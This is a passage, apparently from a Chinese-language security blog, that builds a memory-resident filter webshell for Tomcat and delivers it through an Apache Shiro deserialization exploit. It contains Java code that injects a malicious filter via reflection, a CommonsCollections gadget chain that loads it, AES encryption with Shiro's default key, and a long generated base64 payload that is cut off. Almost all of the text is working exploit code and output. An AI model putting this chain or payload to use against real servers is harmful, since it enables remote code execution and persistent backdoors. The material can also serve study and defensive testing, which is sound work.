config);<br>            <span class="hljs-comment">// 将FilterMap添加到StandardContext中</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">filterMaps</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterMaps&quot;</span>);<br>            filterMaps.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> filterMaps.get(standardContext);<br>            Class&lt;?&gt; aClass = Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext$ContextFilterMaps&quot;</span>);<br>            <span class="hljs-comment">// addBefore 将 filter 放在第一位</span><br>            <span class="hljs-type">Method</span> <span class="hljs-variable">addBefore</span> <span class="hljs-operator">=</span> aClass.getDeclaredMethod(<span class="hljs-string">&quot;addBefore&quot;</span>, FilterMap.class);<br>            addBefore.setAccessible(<span class="hljs-literal">true</span>);<br>            addBefore.invoke(o, filterMap);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        System.out.println(<span class="hljs-string">&quot;执行doFilter&quot;</span>);<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;cmd /c calc&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我可以用 javassist 生成对应的字节码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getEvil() <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">ClassPool</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>    <span class="hljs-type">CtClass</span> <span class="hljs-variable">evil</span> <span class="hljs-operator">=</span> ctClass.get(addFilter.class.getName());<br>    <span class="hljs-keyword">return</span> evil.toBytecode();<br>&#125;<br></code></pre></td></tr></table></figure><p>后面就是构造 Templates 的链条实现类加载了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.shiro.codec.Base64;<br><br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.spec.IvParameterSpec;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC321Memory</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getEvil() <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">evil</span> <span class="hljs-operator">=</span> ctClass.get(addFilter.class.getName());<br>        <span class="hljs-keyword">return</span> evil.toBytecode();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setField</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class&lt;?&gt; clazz = obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">gadGet</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setField(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;getEvil()&#125;);<br>        setField(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;addFilter&quot;</span>);<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br><br>        <span class="hljs-type">LazyMap</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> (LazyMap) LazyMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, templates);<br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(tiedMapEntry,<span class="hljs-string">&quot;lingx5&quot;</span>);<br>        setField(lazyMap,<span class="hljs-string">&quot;factory&quot;</span>,invokerTransformer);<br>        lazyMap.remove(templates);<br>        <span class="hljs-keyword">return</span> map;<br><br>    &#125;<br><br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 序列化map gadget</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos).writeObject(gadGet());<br>        <span class="hljs-type">byte</span>[] CC321bytes = baos.toByteArray();<br>        <span class="hljs-comment">// AES加密</span><br>        <span class="hljs-type">byte</span>[] encryptKey = Base64.decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<br>        <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES/CBC/PKCS5Padding&quot;</span>);<br>        <span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(encryptKey, <span class="hljs-string">&quot;AES&quot;</span>);<br>        <span class="hljs-comment">// 创建IV 随encrypt一起传输</span><br>        <span class="hljs-type">byte</span>[] IV = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>];<br>        <span class="hljs-type">IvParameterSpec</span> <span class="hljs-variable">ivSpec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IvParameterSpec</span>(IV);<br>        cipher.init(Cipher.ENCRYPT_MODE, key, ivSpec);<br>        <span class="hljs-type">byte</span>[] enEvilbytes = cipher.doFinal(CC321bytes);<br>        <span class="hljs-comment">// 拼接IV和加密后的CC321</span><br>        <span class="hljs-type">byte</span>[] IVandEncrypt = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[IV.length + enEvilbytes.length];<br>        System.arraycopy(IV, <span class="hljs-number">0</span>, IVandEncrypt, <span class="hljs-number">0</span>, IV.length);<br>        System.arraycopy(enEvilbytes, <span class="hljs-number">0</span>, IVandEncrypt, IV.length, enEvilbytes.length);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">IVandEncryptB64</span> <span class="hljs-operator">=</span> Base64.encodeToString(IVandEncrypt);<br>        System.out.println(IVandEncryptB64);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>生成的 payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">AAAAAAAAAAAAAAAAAAAAAItICRDL55PQ4M+uF<span class="hljs-regexp">/0QjIxmsxx8mwO0zL+cCUsm9HObVST6ifzXbe1pfVhnBOcNB/</span>avKvCNhZKKEkw8li0SSbf62ZGen2JxK9GPNTlXi10BCSiCCjUZj2I2OccLu<span class="hljs-regexp">/h/i</span>BFMCuLAaK+Qzr6jV6+n8rm8vAp3o7q2HqBXHvAtciY4ur4CJ356Mme5jrqdtaI++cjAuJgvjG3cRsWrMSooPDeAci0crfFK+<span class="hljs-number">3</span>Lj3yVUF1Hic+S2UG4nlsv9ixbN2kQ9h96YKRFwc+FVEtLlOyKCsf7cbvPwDlb8zQpfu9I5GlgAyBJ8HToAFRfx+Sc<span class="hljs-regexp">/sXdACA2nQail4+3eEQ+P2avZI0VYatZ4+OJzNUiGmZPWpRvjlaBvMQ4ywEjndwP9d8Ye+tPXJoO8L9bWbXbNk46rBqlO1u4BF0GpEYqwCs88gaQWYwo/</span>aVvajl5hdyY1vBh0<span class="hljs-regexp">/kK2R3WoQ9j4mEBHUVF9de203eoiO+DaWsxmvZkeqpAzdt1EkJ7t1uC1bswdrSmGizBnQcwNK2+6AfRAXvq0ZRYNFWlY3o9rOEWrLX1ZKHbpqj8pJ9N8ikayN8rJwqWOElSs0hHBhEzUk5YzF5XhXpjR4ULmMThYBlQHLX+wk9VmuVQSeVXTXPJ7+vAzQLYkJj7WnZfBBqEcNWceZTLVeytO9OwAqobYRliwOtENtZ3a95n20P7SZEsaAnlUTRUKZwwfTyA4faexOs0u3SzuERuvGfuHVh/</span>cL0E3IY9yAAThS8GYfyXnv28PTU<span class="hljs-regexp">/TEhTO+NrXqmNs6S4FRXtQjoFG5LnAPTbzePfr8FOE+/</span>RbSy3FvEBTyBfnnUUwvQPsbVWnAwt4DHmpH4NQFQ<span class="hljs-regexp">/TZHJvzqpvkUp0oGr7Jxl2L8b8SuXGn/</span>dsGFsHuuE2nIlsVS5IUG6l+<span class="hljs-number">7</span>tfV4GSqzxLD7tmd7zLdt5buquKw0DtyYarKVfjXOciVSNUXxVKkT82f5kDfFzqU+ZAtyBnf<span class="hljs-regexp">/HMGk1tihlmXR7zAea7RuQqzVsrzjSqsZ9kKTN8kzKnVfzJCeOsoi0Bc0Lo2kYM7auqr13EbdxLWuwrBagcqICL24G+Gi9eG8izu1j4L5Vwl9fRekIvDiWkF8RDIo2z1sKvzgob/</span>rb+F9zDOEg3939rIxqgEQe29jLYiNEopz+<span class="hljs-number">2</span>O6ggb3HP5HyfskWo0WFyz25NsY5NVlJxdj4CiJhSjH6vQ3nZYJ0bd4LuuvshFmtRHBXIt8nPJOh+T2F9UdM4BTGyhrdrAsKoX16zQ1Zc2PFjyBNPvE3lovWCbIK+<span class="hljs-regexp">/jKkQP8cC8LDnhyYZhNv7KVlUuXgQw5LqTEXlLVjU6Yfae7pZvIqL5zi+zizlofnkggQXDvIvlAZQbW1ge3yY+UrtxKjiyYA12EU2MAeFQBwFtz1BU76874lW67f06lSljPS9vmZVAsj0nOfCnZ1jsXZ06QM9hDnDs7PDTZ3HKZ6G1t92BFT87OAP66PF8HtpaVvjqJ/</span>JxPYeUg1uNuNutiDcu+n41jXOg4O1nQHJyEIqizZb2A<span class="hljs-regexp">/uZhOQKQfDyn9d4YQvcxYtALGuGZbalbEJhJyRyQPNgjnt9KoeVlV5dLYjJjkj4lBg6qID8q643QsUNQdyqF5CMjg/i</span>H1<span class="hljs-regexp">/UG/</span>hhopF0YOEf2+qkd1mcuD6if5GJoEw7<span class="hljs-regexp">/Fyd5SFtI2NckN2Z/m</span>l3bccDNcL0uNtl<span class="hljs-regexp">/69zlnXHUpmbctpXJTVVdx9GfNf1Kh9gY3v5wEsBn5GKUvUA7liucaow01wZszXx1iMHdC+q6SYfjqAr+ZmOqmS5c2hJbwgi7Zkyec8iFx/</span>fn4tPg7OOypNSo3IQz9PFwRGsSxBMS5KnON4igX2tzcOrP3n+QW<span class="hljs-regexp">/4+YkqH59CAVeq9FjGHNUba3rJWGRtNEi5TitrVO8dbsPwRgHQaLrL6ecbk/</span>xiwLmZyaJtKR6NCOLAKMEE2u7sJzCGwI4ITQwkomnWDtb8VJ0kNTC5uh<span class="hljs-regexp">/rqpc8sRhKGfPpevcKQbguS97V+DJhgyMy1L/</span><span class="hljs-number">802</span>DEWEUL1ZHp<span class="hljs-regexp">/X0cN19FLoFvyuWGfMtt910ysIgMdDM/</span>cBnoN3L7Uy<span class="hljs-regexp">/DIaqrq8ZoY3vDsk3Y2uEP7Ytum8DgqaMSnHD1LGff68EfJT+Eidjq2I0X0BxpQSqqDS5IJihnZUMm4HZb419mYcNrhkstvWXK1dsQbWXr2oyeAX8dC/</span>xDedyi7QaGXFhaF3xmVsNhpwegtALV0AwHWarbgXXaAotrC2I<span class="hljs-regexp">/XjNNvjzx99JSwi4l4t26zgWYbVhQ0BGYWTZ5sIAmii1kL2UiNVS5NFmBOxbmHn055qQ+X4GZY6fW2+WniNCaw3Nw86tRgvNlls+TSTZul2UdQtn8WOrzRFwMKxpkf93Wj32GaojpfQ5Vv2mtqlvYBKAAxR9DySYJvau3+V2xy3Sah55HIz5oMg0WuaOcvIaKFvCmDcf+vW9ZggnBUJpg5Dl7BcORaLl4vXjkIpSMKrLhIGCmW5aGvLiWhVpq9rZH/</span>pK<span class="hljs-regexp">/Lg5Gu8/i</span>Tf<span class="hljs-regexp">/E5fn14yQ0CBujao2ZpWrXr80g0CAxaS6d/</span>c7<span class="hljs-regexp">/k9bnYF0x0uO6+Uw0gA8DrAgLz2v2vlYVaR8DkE6cEKMKs9WEtBPuBc6b52LqfPeSFzKDPO7VqkSNWU3LNkFFkX1M1uqCba7q5wEOBdq6vose+WfueNXQC/y</span>GibTL+QwZqam3HSSnG1XKb+NEAXB1ejuCqqhzmOvIuCnu5W0epG7ubSTLh1aIcAJE91KCKwD6c<span class="hljs-regexp">/pghpyvzEpsrG9lzRYaTcWuylty3cHv98fuhiGxVtBXqp57WQ7zE9o4VuLL8Qk8xtcr2Cx08/</span>teg0A111ClEIYZImynyZp5<span class="hljs-regexp">/Xz4VErhHBvjZE2zdPPFATdalbl40Q0ahmyRWLFYkeVt1+nUwFMHuXeZa8mgwZbGDF/y</span>fmqRPnIv+iNatXSpeI3jcLvMZ5EK5H89Ujt5ikSnQihKRE80DOZehUhMv8Is5VTYVpvkAKyxAiHAfis9IBjNs8RV8slDgEWHQ6lBrrXssvChEu<span class="hljs-regexp">/1nVyK1mOpZrYl5bL4VaOC2Vb8VgNdwlyn4vgd/</span><span class="hljs-number">6</span>MxQcvnAh9QcHvA3HRveg1G2AaXAZhgbN5v+aN<span class="hljs-regexp">/u6WFNnwufIQsb4268nxgWzmXAu1fRB/</span>YYdt71Dl2W9VbLQGgeFNKJbndBo<span class="hljs-regexp">/rfJ8w8hyp9d324/</span>CwOzfgbGCWdpB0ULOghQQxcMopxaOEcePzUVtUc8TswMd0pufxEzsc5cDn+qeybVwm6zS4H23H1eDKDbREUvX6geR1caQ+bNgwOQpXCXYTMR+HDJx7fu1GvB2pJjmNkFQol62cG3CiKbI+cJdoTFxk2z0CCTdbDtZcL5qiOAGGgqlYitijwIXlt2EuYvmjyCTY1o9cacZyrbUL<span class="hljs-regexp">/DEYmer6qqGAWHCl+Dq/</span>jtKauhEs2H1cnKRGFxq24oxSYgzgoCWhvxIE1yi<span class="hljs-regexp">/h2QqwCNQHwE57XLiiFUnHXGsTIro0DePEuvJ9eu/</span><span class="hljs-number">3</span>WilwKm+h3pCxPJ4e7iBGipA26njnMjh7d5ZxQlinxbGpJ1aLBNpzwO+bQcXJm<span class="hljs-regexp">/JvCUzbQY/</span>nxzIIYYD36w<span class="hljs-regexp">/xPKp97VrlwziDHMTK9LtN5Ae1M0+w4ZGrs6frMSpG9Sg/</span>Ne9<span class="hljs-regexp">/0WYZHmhzw2fuuTHYf+0kIwKDIKxetn1Wkktahr+q1o+USqcDyuzBaKRdcqsAy9BF/</span>avNGA7wtAh3H7sK4JPbLPwJWm38RDii3b5ur5JptlBlqDcdSnlP<span class="hljs-regexp">/Nsn6ZW9hsLJX2bGi+ErKAKhRZhfLXyxJ3vNXNytCI0m+PTBadcaCtOfPLSt3e22wD/</span>KlbVPFbgFS6m<span class="hljs-regexp">/adUTNt5DUcbY7IbFPiqh0U6ZHCU8wmpmg27y+PG4SJJPAtkyo9TF7MoD/</span>fPUSWKgKGtnqfiD5XVYqMovc8ncIgoYHU7im1thwHURr94oDW0jaDLcbJMNBG2y3kvK3GZjt2K2BDJzdt4iX987mlNIlK3aFNVDEOrTF9rDNfrSfCxm2u+Sz1Bx0zlnZUUiKfJJrlGKSPFQeyAw1B6C<span class="hljs-regexp">/toCNUZu5vps8ePtgQij/</span>ayrJYEe5cTCQ1juRoANoWFYiY9ubK0UIKM138Jf<span class="hljs-regexp">/j+t/</span>+YoBfJqhaxsVjYelC6<span class="hljs-regexp">/3Srp0I7upD3AGCFzCQItJXMgLpIO1CrkVL3TBBeCwU7uj+kLtoaaHqIlrla1cDZ3zlTG8AnPLShFJB0kSkr/</span>pCTxUpk2PjYnLMjA3LxXh7VXO+J<span class="hljs-regexp">/TAPE+RXtvM4ZeB8+Amfwn5MQsl9IA8nxvvTFU9+d4uyiZq0Fvkds/</span>lIlPCYH07DgCkpiqBhPSg6CQFVfj6AuVA+p5M4jcZFNXjIUV1vDq2GWlcBaqBsBznJOq9Sn7dA6ykw5o5c2VDiN5xyzC91i8HzUAX9owQntddNSnErfqC0pdnnMyighrarZ5mo1Yaidy<span class="hljs-regexp">/S3SzWz8Cd3pMVden7yGmEobIn20MRi/</span>HCyOENDpKFWLvYruVt92eohm0V17wey1nil9zc6jhFSFcHFJEUhhRwg5yCWG5eqfMh8UHwzJkBkDeLyeWHZBkTfOykeg0kOOibE9ZPI+MICTMMgm0CnTsLTUx84BmVBvXu<span class="hljs-regexp">//</span>lE9F<span class="hljs-regexp">/TMAfQW9RLCQU4QXPsUDIbQWciy9I7eeBWnLXjXZ3VA4SmVytvepD4qxLM9aJo6USBxCNxYn9FyeEI3QtEe8VHCb6PFBHos6HquhEYn87g0eriq0zzj0l8uou5J7IPVxGgZdLm6dPU0bpkTRLOyiP9Su849OtHJEptUwd7fNreOkhoYuwcynCrQznpvz1qJOH/</span>lt5aWEPKWqT8P0<span class="hljs-regexp">/v0QVt9/</span>bEra<span class="hljs-regexp">/Cmb3e0V75mVbbFbfk4W97P3yf7va6FHGoW1+1XmcdSssVzTj/</span>v<span class="hljs-regexp">/RbZl2eI5IoQnTf36aaya397iBJxKeBvoVmdmShOWC9B8IbqGpFSCgVnNi6bVF4gLFjviF535eQPy7WCtOMqW8EOaet0x/</span>bmQYHm7KV93gx+yymsKZQFQdUhvRsb2+MqwLKvB4vleGdhramQh2vt1CjJzTCgjBDattjGmTIgAwwXSJOH2Ys46MzPTAnU2IPeB421u5l4SMn+<span class="hljs-number">66</span>kVEm3gGB0LjK34KjJv2E3yZXELj2OIP2wXDsEu+NO0SlIi6KCXCxkSpktevFTaA5qAY8KEMc87BIg9mSuozaQo<span class="hljs-regexp">/vD3vbfyeD/</span>YYcCoZ2jh4kPyQgXaTw0oJmb349NKZQEOnUV1Qp8elV<span class="hljs-regexp">/s8BL7vo0xRwRTlTHuzrFd1NK3nZ4O/</span>qTRv28yR+UM7acviwLs1Hso<span class="hljs-regexp">/KR41ykZuznYR91th4hFZD3T/</span>fA4mOFMODd<span class="hljs-regexp">/+ugvYBZ7PLXH7FkbYIxpYSMg1bPsL0SsphJ0Eq0whlCqM9llboUgCtTpHCdQ5C5jeKoAbV/</span>RSxoruDtGvpnpy9hCBLmJZeOB7UHKuATRapt7QV65ahTUUoCfyPuusD99dq3aZmcDTN8mzqeg7hfYOdUCyYVaVER60E8lIoIo<span class="hljs-regexp">/Nse2zZfzLNz6YF0xfnh1mDADdZaMBi43GQxh4P5JUJGI6K7+NCgOJLQFOj556PWUtXiiN3Eb4eRDKtDHzSTPrO6KTnTK8ZZvV55lmMx9h+s9Meh43xEXSbTCb9+SpnuGPSFzNJ2OQeH056DnSj33DAY1c7bEcyZwaI2QwwoUiAv/</span><span class="hljs-number">1</span>kxYBpAh2VcPdBlqnQ<span class="hljs-regexp">/4BD8I5zvv6Mb2E3LSA65/</span>aFMMu8GwFKcJJA202jibVd<span class="hljs-regexp">/G6Ww1z/</span><span class="hljs-number">0</span>JbJVOA2Bj0k9PwYWTNTWnzs8ZRiLSIQ51g2XAJXyXSEVWVFjcyBOTJI<span class="hljs-regexp">/BjAj25Pe8RCqYuA8bGsbYN7PamJ6GzXn3OEs6g6YHkaD9D0+iSWxbaAh7dkOnrFeAjQfafTPB9Pi4qcnxQVbybnO0adeHTkyfMygd7S98LkwzvAFpj5Zf/</span>MHDcTJCzo0Ek9yJIk9zEuhAGr6Tev1dHM5xKPr4QvQ8EaOvIHFU1cG0sHX+Gge+S4JBndA0Txv1K0W2+R11hW8gB95W+bpg1mUKXxxgf<span class="hljs-regexp">/8i8NZYAjulpH/</span>I2jBhUsi+CcoziAaVCPq65c7QLIPbZ1JbG5F+qOabhEsYml2sP0pyKGsKRUlyRBoG09zeO2KveL3PaloDK6NFTvuZrD1wn9CBRUtlHMOufsnO9BcBBbDPr1ctC+fniaSprefm9Zg0t+oJEexXvvG+CzGQtMbpnLl3Q560<span class="hljs-regexp">/CFlJGYUXxtPzKmV6TJO8JaifiNyBWrcwzaKd8k1V628Z5p7feJ3RzcTHU1vGkXB3yUCJwsg7OKOUd8AMibgZTNI5E6omq5KNZIvFF0hUl8k3uWSnLSbv10SyQlJhRcfPlbbmwYdT4hhU7oCvJ64+VMFh6o+NF/</span>hYZvmFd4UC1UMCvIAldMSJScC4QHAyF8f8kDs8lS5kNnTgiaYldMxdIz1KpsF1KMpTcB9A4trYsX6lQfQ93M3sJeBsW2DJCo7C1o9UhJo+<span class="hljs-number">9</span>kpdWtuzFbG<span class="hljs-regexp">/m7ya59gqNle4f5hpfwFzOEKjJD/</span>YBs4w1llWbnVOC2Owd5O6BqTF7Y8Egs2o08RNeXlvx0hv073jeYMXomifMwvqEt<span class="hljs-regexp">/vNADusHHcQmpot1Zwie6jsvuwwVBWZs3yw5LCIDzS6o6iQAoDncWY/</span><span class="hljs-number">8</span>zQWFoclQPeEM2mbEAPsEeCvvkk+<span class="hljs-number">4</span>Rf83jHCJC3a4k+Jd3B64RY<span class="hljs-regexp">/M51YlZgGQO/</span><span class="hljs-regexp">/QdM2z4nmKvOw8ukQQJV9z+LOlOiam0+ERQAkY12opxTQc47QIkgZa3ct/</span><span class="hljs-number">0</span>G2ZpK3gzZSAB0DAZSGUvPfIuPXeVhwMBD3KonCWSuSvVt<span class="hljs-regexp">/qKPf8usLeDWtwZC0iOQyfdGxrHID5wojIxeGLUjSJD49FkDzsm/</span>cXGfNocwCOAKDcf<span class="hljs-regexp">/2v9mpP+UZ8XEl7pEdDUX4tCf8TY5jlnYqrGWJaVuxGvX4Iku7QVmuq9eeCh62Tx0VotEHhjbEnuoQmHt/</span>RNLNyzSY1i33G0ZdNsqw3gEAccmcqXWwty6sJIpVyptW7zzz3ls3jra4abR9p7b9sFrKMl2cHQnRwgoC+RO<span class="hljs-regexp">/RQSCZAORmDa4ZLXMzduIPwwVEzrGb19XaRD0lwtaEiYFBtrg7OzGojsf9INyl1O0PriMyj6xNVmFI7kOHWB4rqqf1qrsVWImP0+RAgb+NmU42qSvso+bbNJ7sTlGN3ZthOmNWr2K0xF0bLOKoIBeqWTkdaosIdSovgbORbhKuVe5v+boIJNka/</span>YE149aOgTDIxklHStkinWrlMGKWJDTdh4psLThv+D8EnJJthkAG2CGC<span class="hljs-regexp">/XJPLO5OzvvQ5K5QMkmMAZxT4JqUxJWsgB311YSVGJPwG59IAOo8CBsRo9no8jYU6vpOed3NFbBVnWk8C/u</span>368oSRLPPbfDeI3weOE7LEuTK<span class="hljs-regexp">/H71H1hIN88y7X+g9dINN9Az0vreJ2yWzvrFTedxv4t01BeOtW+Mm4ZlwpgbDzLT9gMfH1K6ngp8RfTW+LmqLu14kW+l3U0nKj6CaCZHQr+pkQo4eLZ7dbofZtuOuUY43zFrDgcNfzflaisJCMxloPPHxUz38PFckHPSBFbI5v/</span>LfBkVx0Eny5dkkucGyvDwvoRBjO4w6E5wIE3B38AfFOc8uVP0TbIPDiQsr4o9bJEPLNFdY<span class="hljs-regexp">/7MJLG5h8pNaBAicecDeMpEFMVwFyNWASIS0awQau6+vXoEHjAqgzvMeG5OU4y6V70Zu/</span>v7uQZO+EtxeZ+S1QXd7KwgIflRq8VyrgDfelQ2d0vjBjvNJMiM+G8AZCKDmpmdnUTLuQcem5JLk6tYbfTO6KdPyifP0Xh2ivf0Xw78Sd1H+<span class="hljs-number">4</span>g<span class="hljs-regexp">/3NEFsu+czOgWH+2P/</span>b6FswJLS7c1FJw19Kl6JqdF2aoMGN3V3qGDvDZdmvTu+znaLTR9EUC4FDWW1mG4j5yYZ4D0k<span class="hljs-regexp">/yNIip7SUyqdaQL4DGyQUUDOOOi/</span>ExH3GiMD24oV6<span class="hljs-regexp">/2Qfxxe8yhDfwmFjqB1QtB3Hmawqs0+CWnDnRdr4wC/</span><span 